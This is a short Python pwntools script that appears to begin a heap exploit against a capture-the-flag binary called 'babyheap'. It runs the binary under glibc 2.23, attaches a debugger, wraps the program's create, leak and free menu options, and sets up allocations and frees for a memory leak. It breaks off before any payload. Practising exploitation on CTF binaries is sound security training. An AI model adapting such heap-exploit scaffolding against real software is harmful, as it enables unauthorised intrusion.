from pwn import *
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.23.so','./babyheap'],env={"LD_PRELOAD":"./libc6_2.23-0ubuntu10_amd64.so"})
context.terminal=["tmux","split","-h"]
gdb.attach(target)

print(target.recvuntil("> "))
def create(size,data):
 target.sendline("1")
 print(target.recvuntil("size: "))
 target.sendline(str(size))
 print(target.recvuntil("data: "))
 target.send(data)
 print(target.recvuntil("> "))

def leak(index):
 target.sendline("3")
 print(target.recvuntil("idx: "))
 target.sendline(str(index))
 print(target.recvuntil("data: "))
 leak=target.recvline().strip("\n")
 print(target.recvuntil("> "))
 return leak

def free(index):
 target.sendline("2")
 print(target.recvuntil("idx: "))
 target.sendline(str(index))
 print(target.recvuntil("> "))

create(256,"A"*256)
create(256,"A"*256)
create(256,"A"*256)
create(24,"A"*24)
free(0)
free(1)
create(0,"")



target.interactive()
